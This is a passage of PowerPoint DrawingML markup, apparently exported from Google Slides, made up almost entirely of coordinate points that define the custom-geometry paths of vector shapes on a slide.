                    <a:pt x="1321" y="11299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1872" y="11262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3009" y="11189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="11042"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9355" y="11042"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="11152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9465" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9612" y="11299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="11299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10272" y="11299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10382" y="11262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="11189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10969" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11152" y="10602"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11299" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11336" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11409" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11299" y="9685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11189" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10859" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10492" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9722" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8878" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="5430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7191" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7191" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7154" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="1945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6934" y="1761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6824" y="1615"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7191" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7521" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="1541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7998" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="1248"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7998" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6824" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036"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1" name="Google Shape;311;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6849975" y="3631900"/>
              <a:ext cx="270550" cy="339350"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="10822" h="13574" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="10235" y="1358"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10345" y="1652"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="1982"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="2312"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10235" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10235" y="2569"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="1945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10235" y="1358"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9538" y="2092"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9538" y="2422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="2789"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9465" y="2202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="2092"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9941" y="1285"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9868" y="1835"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="2129"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="2459"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="2789"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="2936"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="3046"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="3046"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9575" y="3046"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="3119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="3156"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="3156"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="3156"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="3046"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="2936"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="2899"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="2899"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="2092"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9685" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9587" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="1982"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="1762"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="1542"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="1285"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9318" y="2385"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9281" y="3119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="3963"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="4183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="3963"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="3743"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="2569"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="2385"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8107" y="3596"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7997" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="3596"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8731" y="2972"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8731" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="3816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="4403"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="3816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="2972"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8364" y="3339"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8254" y="4733"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8181" y="4880"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="3486"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="3339"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7704" y="3963"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7667" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7520" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="5467"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="5430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="5430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="4990"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="3963"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7044" y="4513"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6970" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="5320"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="5650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="5797"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="4513"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6603" y="4916"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6567" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="5430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="6127"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="6237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="6494"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="4916"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5870" y="5540"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5796" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="6347"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="6677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="7081"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="5540"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9134" y="478"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9428" y="588"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="735"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="845"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9428" y="955"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="955"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9465" y="1285"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="1615"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="2202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="2202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="2202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="2275"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="2349"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="5907"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="6017"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="6604"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="6714"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="7154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="6824"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="6457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="6274"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2202" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="6127"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="6237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="6237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="6127"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="6017"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="5797"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="5797"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="5650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="5430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="4990"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="5467"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="4990"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="4770"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="4733"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="4403"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="4513"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="4623"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="4770"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696" y="4880"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="4770"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="4733"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="4623"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4513" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="4073"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="3853"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5430" y="4073"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="4073"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="3963"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="3853"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="3156"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="3156"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="3009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="2936"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="2422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="1725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="1945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="2129"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7154" y="2349"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="2532"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="2569"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7630" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="2312"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7630" y="2239"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="1835"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="1542"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="735"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="625"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="478"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3485" y="7264"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3449" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="7264"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5099" y="6163"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4733" y="7264"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="7301"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="6457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="6237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="6163"/>
